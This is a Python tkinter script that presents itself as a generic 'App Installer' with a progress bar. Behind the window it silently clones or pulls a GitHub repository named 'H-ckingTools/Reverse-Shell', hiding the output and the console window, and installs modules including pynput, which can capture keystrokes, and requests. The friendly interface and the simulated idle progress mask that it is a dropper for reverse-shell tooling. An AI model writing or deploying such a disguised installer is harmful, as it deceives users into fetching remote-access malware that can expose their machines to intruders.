import tkinter as tk
from tkinter import ttk
import importlib.util
import subprocess
import threading
import sys
import os
import shutil
from typing import List

REQUIRED_MODULES = ['colorama', 'psutil', 'pynput', 'requests']
REPO_URL = 'https://github.com/H-ckingTools/Reverse-Shell.git'
LOCAL_REPO_DIR = os.path.join(os.getcwd(), 'Reverse-Shell')
GIT_TIMEOUT = 30  # seconds


class AppInstaller:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("App Installer")
        self.root.geometry("450x180")
        self.root.resizable(False, False)
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

        self.style = ttk.Style()
        self.style.configure("TLabel", font=("Segoe UI", 10))
        self.style.configure("TProgressbar", thickness=20)

        self.main_label = ttk.Label(self.root, text="Preparing installation...")
        self.main_label.pack(pady=10)

        self.progress = ttk.Progressbar(self.root, length=400, mode='determinate')
        self.progress.pack(pady=5)

        self.status_label = ttk.Label(self.root, text="Initializing...")
        self.status_label.pack(pady=5)

        self.details_label = ttk.Label(self.root, text="", wraplength=400)
        self.details_label.pack(pady=5)

        self.running = True
        self.install_thread = threading.Thread(target=self._installation_process, daemon=True)
        self.install_thread.start()

        self.idle_progress()  # Start idle progress bar
        self.root.mainloop()

    def idle_progress(self):
        """Simulate idle progress from 1% to 100% slowly."""
        if not self.running:
            return
        current_value = self.progress['value']
        if current_value < 100:
            self.progress['value'] = current_value + 1
            self.root.after(50, self.idle_progress)

    def on_close(self):
        self.running = False
        if threading.current_thread() != self.install_thread:
            try:
                self.install_thread.join(timeout=1)
            except Exception:
                pass
        self.root.destroy()

    def _installation_process(self):
        try:
            # Stage 1: Update repository
            self.update_ui("Updating Application", "Connecting to repository...", 10)
            self.update_repository()

            # Stage 2: Install dependencies
            self.update_ui("Installing Dependencies", "Checking required modules...", 60)
            self.install_dependencies()

            # Complete
            self.update_ui("Installation Complete", "All components installed!", 100)
            self.details_label.config(text="You can now run the application.")
            self.root.after(3000, self.on_close)

        except Exception as e:
            self.update_ui("Installation Error", f"An error occurred: {str(e)}", self.progress['value'])
            self.details_label.config(text="Check your internet connection and try again.")

    def update_ui(self, main: str, status: str, value: float):
        if not self.running:
            return
        self.root.after(0, lambda: self._safe_update(main, status, value))

    def _safe_update(self, main: str, status: str, value: float):
        self.main_label.config(text=main)
        self.status_label.config(text=status)
        self.progress['value'] = value
        self.root.update_idletasks()

    def update_repository(self):
        git_cmd = shutil.which('git')
        if not git_cmd:
            raise Exception("Git not found. Please install Git.")

        if os.path.exists(LOCAL_REPO_DIR):
            self.update_ui("Updating Application", "Pulling latest changes...", 20)
            subprocess.run(
                [git_cmd, 'pull'],
                cwd=LOCAL_REPO_DIR,
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=GIT_TIMEOUT,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            self.update_ui("Updating Application", "Repository updated", 50)
        else:
            self.update_ui("Updating Application", "Cloning repository...", 20)
            subprocess.run(
                [git_cmd, 'clone', REPO_URL, LOCAL_REPO_DIR],
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=GIT_TIMEOUT,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            self.update_ui("Updating Application", "Repository cloned", 50)

    def install_dependencies(self):
        missing = self.get_missing_modules()
        if not missing:
            self.update_ui("Installing Dependencies", "All modules are present", 80)
            return

        total = len(missing)
        for i, module in enumerate(missing):
            if not self.running:
                break

            progress = 60 + (i / total) * 40
            self.update_ui("Installing Dependencies", f"Installing {module} ({i+1}/{total})", progress)

            try:
                subprocess.run(
                    [sys.executable, "-m", "pip", "install", "--user", module],
                    check=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=300,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                self.details_label.config(text=f"Installed {module}")
            except subprocess.TimeoutExpired:
                self.details_label.config(text=f"Timeout installing {module}")
            except subprocess.CalledProcessError:
                self.details_label.config(text=f"Failed to install {module}")

    def get_missing_modules(self) -> List[str]:
        return [m for m in REQUIRED_MODULES if not self.is_module_installed(m)]

    def is_module_installed(self, module_name: str) -> bool:
        try:
            return importlib.util.find_spec(module_name) is not None
        except Exception:
            return False

